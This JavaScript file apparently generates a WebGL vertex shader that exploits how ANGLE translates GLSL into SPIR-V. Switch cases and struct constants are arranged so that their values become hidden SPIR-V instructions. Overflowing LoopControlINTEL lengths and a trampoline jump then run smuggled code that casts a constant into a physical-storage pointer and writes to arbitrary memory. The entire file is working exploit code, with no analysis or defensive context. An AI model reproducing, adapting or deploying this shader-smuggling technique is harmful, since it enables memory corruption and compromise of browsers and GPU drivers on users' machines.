const assert = (condition, message) => {
  if (!condition) {
    throw new Error(message);
  }
};

const assert_or_else = (condition, message_func) => {
  if (!condition) {
    throw new Error(message_func());
  }
};

const storage_type = {
  Physicalstorage: 5349
};
const op = {
  Nop: 0,
  TypeInt: 21,
  TypePointer: 32,
  FunctionEnd: 56,
  Store: 62,
  CompositeConstruct: 80,
  BitCast: 124,
  Label: 248,
  Branch: 249,
  Return: 253,
  LoopControlINTEL: 5887
};

const build_inst = (opcode, length) => {
  assert_or_else(length < Math.pow(2, 16), () => `instruction length ${length} doesn't fit into 16 bit`);
  return length * Math.pow(2, 16) + opcode;
}; /// start off by building shader template


let needed_word_vals = new Set();
let word_val_to_identifier = {};

const word_val = word_val => {
  assert(typeof word_val == "number", "non-number word val supplied: " + word_val);

  if (!needed_word_vals.has(word_val)) {
    needed_word_vals.add(word_val);
    word_val_to_identifier[word_val] = `{{WORD VAL ${word_val}}}`;
  }

  return word_val_to_identifier[word_val];
};

const _default_str = "default";

const get_switch = selector => ({
  selector: selector ? selector : -1,
  case_infos: {},
  case_values_set: new Set(),
  filler_code: "",
  add_case_int: function (case_index, int_val, code) {
    assert_or_else(!this.case_values_set.has(int_val), () => `tried to add duplicate int ${int_val} to cases`);
    this.case_infos[case_index] = [int_val, code];
    this.case_values_set.add(int_val);
  },
  add_default: function (case_index, code) {
    assert_or_else(!this.case_values_set.has(_default_str), () => `tried to add two default cases`);
    this.case_infos[case_index] = [_default_str, code];
    this.case_values_set.add(_default_str);
  },
  set_filler_code: function (new_filler_code) {
    this.filler_code = new_filler_code;
  },
  to_string: function () {
    let max_index = Object.keys(this.case_infos).map(e => Number(e)).sort((a, b) => a - b).pop();
    let filler_idx = 0;
    let cases_str = "";

    for (let i = 0; i <= max_index; i++) {
      let case_info = this.case_infos[i];

      if (case_info) {
        let value = case_info[0];
        let code = case_info[1] ? case_info[1] : "";

        if (value === _default_str) {
          cases_str += `default:${code}`;
        } else {
          cases_str += `case ${value}:${code}`;
        }
      } else {
        const get_next_filler_int = () => {
          filler_idx += 1; // mark filler ints so they're easier to spot in the debugger

          return 0xf1 * Math.pow(2, 24) + filler_idx - 1;
        };

        let filler_int = get_next_filler_int();

        while (this.case_values_set.has(filler_int)) {
          console.log(`filler int ${filler_int} would be duplicate, skipping...`);
          filler_int = get_next_filler_int();
        }

        cases_str += `case ${filler_int}: ${this.filler_code}`;
      }
    }

    return `switch (${this.selector}) { ${cases_str} }`;
  }
});

const build_overflow_switch = words_to_include_after_switch => {
  let oswitch = get_switch(-1);
  oswitch.add_default(0);
  oswitch.add_case_int(1, build_inst(op.Label, 2), "break;");
  oswitch.add_case_int(2, build_inst(op.LoopControlINTEL, Math.pow(2, 16) - 4));
  oswitch.add_case_int(Math.pow(2, 15), build_inst(op.LoopControlINTEL, 12
  /* also overlap all of the label declarations (including merge block label) */
  + words_to_include_after_switch), "break;");
  return oswitch.to_string();
};

const build_trampoline_switch = jump_length => {
  let tswitch = get_switch(word_val(build_inst(op.LoopControlINTEL, 2)));
  tswitch.add_case_int(0, // +8 should mean that the merge label is immediately overlapped
  build_inst(op.LoopControlINTEL, 8 + jump_length), "break;");
  return tswitch.to_string();
};

let increment_points_id_ranges = [];

const increment_insertion_point = (insertion_point_id, start_id, next_id_after) => {
  let ident = `{{ID_INCREMENT${insertion_point_id}}}`;
  increment_points_id_ranges.push([ident, start_id, next_id_after]);
  return ident;
};

const val_kinds = {
  LIT: 0,
  ID_FOR_CONST: 1,
  NEW_VAR: 2,
  OUT_VAR: 3
};

const lit = val => [val_kinds.LIT, val]; // id is set by angle to point to the supllied const


const id_for_const = (val, const_type) => [val_kinds.ID_FOR_CONST, val, const_type];

const new_var = var_name => [val_kinds.NEW_VAR, var_name];

const out_var = () => [val_kinds.OUT_VAR];

const consts_used = {
  pointer_arr: "int[2](-1, 0x1234)"
}; // helper to avoid typos

const var_names = {
  casted_pointer: "casted_pointer",
  int_type: "int_type",
  pointer_type: "pointer_type",
  overlap_int_type: "overlap_int_type"
};
const spirv_code = [lit(build_inst(op.BitCast, 4)), new_var(var_names.pointer_type), new_var(var_names.casted_pointer), id_for_const(consts_used.pointer_arr, "int[2]"), lit(build_inst(op.Store, 3)), new_var(var_names.casted_pointer), id_for_const("1337", "int"), lit(build_inst(op.Return, 1)), lit(build_inst(op.FunctionEnd, 1)), lit(build_inst(op.TypeInt, 4)), new_var(var_names.int_type), lit(1337), lit(1337), lit(build_inst(op.TypePointer, 4)), new_var(var_names.pointer_type), lit(storage_type.Physicalstorage), new_var(var_names.int_type), lit(build_inst(op.TypeInt, 4)), new_var(var_names.overlap_int_type)]; /// parse what we just defined

let includes_out_var = false;
let new_vars = new Set();
let func_param_assignments = [];

for (let val_info of spirv_code) {
  let val_kind = val_info[0]; // this might be undefined

  let val = val_info[1];

  if (val_kind == val_kinds.LIT) {
    func_param_assignments.push([word_val(val), "int"]);
  } else if (val_kind == val_kinds.NEW_VAR) {
    let val = val_info[1];
    assert(typeof val === "string"); // prefix so we don't collide with the rest of the program

    let param_var_name = "SPIRV_VAR_" + val;
    new_vars.add(param_var_name);
    func_param_assignments.push([param_var_name, "int"]);
  } else if (val_kind == val_kinds.OUT_VAR) {
    includes_out_var = true;
    assignments.push(["output_param", "int"]);
  } else if (val_kind == val_kinds.ID_FOR_CONST) {
    let val_type = val_info[2];
    func_param_assignments.push([String(val), val_type]);
  } else {
    console.log(val_kind);
    assert(false, "unknown val type");
  }
}

const func_param_assignments_str = func_param_assignments.map(e => e[0]).join(","); // we realize an unused variable id with a constant function parameter
// this seems to be one of the few cases where angle reuses the id in the same assignments

const const_func_params = ["label_param", "output_param", "check_param"].concat([...new_vars.values()]);
const const_func_params_str = const_func_params.map(var_name => `const int ${var_name}`).join(", ");
const conrete_test_func_params_str = const_func_params.map(_ => "0").join(", ");
const assigned_struct_members_str = [...Array(spirv_code.length).keys()].map(i => `const ${func_param_assignments[i][1]} a${i}`).join(",");
let template_shader_source = `\
    #version 300 es

    flat out int out_value;

    int someglobal;
    void func_with_side_effects(
        const int op_branch,
        const int param_label1,
        const int op_label,
        const int param_label1_2,
        ${assigned_struct_members_str}
    ) {
        someglobal = 0;
    }

    void testFunc(${const_func_params_str});

    bool addConsts1(const bool b) {
        bool a;
        int c;

        ${increment_insertion_point(0, 106, build_inst(op.LoopControlINTEL, 3) - 2)}
        return a;
    }

    struct DummyStruct1 {
        int a1;
        int a2;
        int a3;
    };
    //hopefully this will be given id build_inst(op.LoopControlINTEL, 3)
    struct DummyStruct2 {
           DummyStruct1 a1;
           int a2;
           int a3;
           int a4;
           int a5;
           int a6;
    };

    // Make angle actually emit OpTypeStruct for DummyStruct
    DummyStruct2 dummyFunc() { 
        return DummyStruct2(
                        DummyStruct1(0, 0, 0),
                        0, 0, 0, 0, 0
                );
    }



    void callMeMaybe(const bool b)
    {
        bool a;
        int c;
        ${increment_insertion_point(1, 202506, 0x90050 - 3)}

        // merge block of overflow switch wil hopefully have the id build_inst(op.CompositeConstruct, 8)
        ${build_overflow_switch(25 + const_func_params.length * 4)}
        testFunc(${conrete_test_func_params_str});
        addConsts1(true);
    }

    void testFunc(${const_func_params_str}) {
        DummyStruct2 retval;

        // construction of Dummystruct1 is emitted just before constructing DummyStruct2 ->merge block label declared
        DummyStruct2 dummy_store = DummyStruct2(
                DummyStruct1(
                        // this is where we will jump to
                        ${word_val(build_inst(op.Branch, 2))}, label_param, ${word_val(build_inst(op.Label, 2))}
                ),
                // we could easily add more of these here if we want to use this specific opcode (CompositeConstruct with lenght 9) in our constructed spirv code
                ${(word_val(build_inst(op.LoopControlINTEL, 1)) + ",\n").repeat(4)}
                ${word_val(build_inst(op.LoopControlINTEL, 8))}
        );
        ${build_trampoline_switch(16)}

        // don't optimize out struct construction pls
        out_value = dummy_store.a2;

        func_with_side_effects(
                // get out of the current block
                ${word_val(build_inst(op.Branch, 2))}, label_param,
                // declare the label we just used in order to not get into trouble
                ${word_val(build_inst(op.Label, 2))}, label_param,
                ${func_param_assignments_str}
        );
    }

    void main() {
        callMeMaybe(true);
        dummyFunc();
    }
`; ////////////////////////////////////////////////
// make sure everything gets it's intended id
// assigning the ids we won't use anyways with "OpLogicalNot"s will only emit
// one 4 word instruction instead of OpConstant (4 words) + OpStore (3 words)
// this should make the resulting shader significantly smaller

const increment_with_nots = amount => {
  const get_ops_producer = ops_amount => "a =" + "!".repeat(ops_amount) + "b; ";

  let result_str = "";
  let i = 0; // can only go in steps of 100 because otherwise angle will refuse to compile

  while ((i += 100) < amount) {
    result_str += get_ops_producer(100);
  }

  result_str += get_ops_producer((100 - (i - amount)) % 100);
  return result_str;
};

let sorted_word_vals = [...needed_word_vals.values()].sort((a, b) => a - b);
let word_val_to_literal = {};

const increment_ids_and_resolve_word_vals = (base_next_id, next_id_after) => {
  assert(base_next_id <= next_id_after);
  let first_at_least_base = sorted_word_vals.findIndex(e => e >= base_next_id);
  first_at_least_base = first_at_least_base === -1 ? sorted_word_vals.length : first_at_least_base;
  let first_unfulfillable = sorted_word_vals.findIndex(e => e >= next_id_after);
  first_unfulfillable = first_unfulfillable === -1 ? sorted_word_vals.length : first_unfulfillable;
  let next_id = base_next_id;
  let generated_str = "";

  for (let i = first_at_least_base; i < first_unfulfillable; i++) {
    let to_fulfill = sorted_word_vals[i];
    let amount = to_fulfill - next_id;
    generated_str += increment_with_nots(to_fulfill - next_id);
    let placeholder_literal = next_filler_literal;
    next_filler_literal += 1;
    word_val_to_literal[to_fulfill] = placeholder_literal;
    generated_str += `c = ${placeholder_literal};`;
    next_id = to_fulfill + 1;
  }

  generated_str += increment_with_nots(next_id_after - next_id);
  return generated_str;
};

let next_filler_literal = 0xfa000;

for (let i = 0; i < increment_points_id_ranges.length; i++) {
  let [insertion_point_id, start_id, next_id_after] = increment_points_id_ranges[i]; // replace insertion point ident with content

  let to_insert = increment_ids_and_resolve_word_vals(start_id, next_id_after); // replace should suffice as insertion points are assumed to be unique

  template_shader_source = template_shader_source.replace(insertion_point_id, to_insert);
}

for (let word_val of needed_word_vals) {
  let placeholder_identifier = word_val_to_identifier[word_val];
  let placeholder_literal = word_val_to_literal[word_val];
  assert(placeholder_identifier !== undefined, "no identifier for word val  " + word_val);
  assert(placeholder_literal !== undefined, "no literal for word val " + word_val);
  template_shader_source = template_shader_source.replaceAll(placeholder_identifier, placeholder_literal);
}

var vertexShaderSource = template_shader_source;